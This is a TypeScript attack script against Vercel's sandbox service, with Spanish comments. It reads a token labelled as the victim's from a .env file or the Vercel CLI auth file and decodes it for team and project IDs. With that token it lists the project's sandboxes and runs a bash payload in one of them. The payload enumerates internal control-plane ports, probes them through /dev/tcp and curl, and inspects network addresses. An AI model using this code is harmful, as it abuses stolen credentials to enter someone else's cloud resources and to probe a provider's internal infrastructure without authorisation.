import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";

const CMD = `
set +e
echo "=== 1. puertos de control en ESTE sandbox ==="
ss -tln | grep -E "3000[0-9]|23456|2666|5000[0-9]" | awk '{print $4}'
echo ""
echo "=== 2. testear cada puerto de control localmente ==="
for p in 30001 30002 30003 30004 30005 30006 23456; do
  echo "--- $p ---"
  timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$p; printf 'GET / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n' >&3; timeout 1 cat <&3" 2>/dev/null | head -2
done
echo ""
echo "=== 3. mi IP y el dominio resuelven a que? ==="
ip -o addr | grep eth0
getent hosts $(cat /tmp/domain_list.txt 2>/dev/null | head -1) 2>/dev/null
echo ""
echo "=== 4. hay alguna app de control plane en 30001? probar metodos ==="
timeout 2 curl -s --max-time 1 -X POST http://127.0.0.1:30001/ -H "Content-Type: application/json" -d '{}' | head -3
echo "=== DONE ==="
`;

async function main() {
  const client = new APIClient({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  const target = sbxs.find((s: any) => s.name?.startsWith("multi-"));
  if (!target) { console.error("no sandbox"); process.exit(1); }
  const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
  const r = await s.runCommand("bash", ["-c", CMD], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });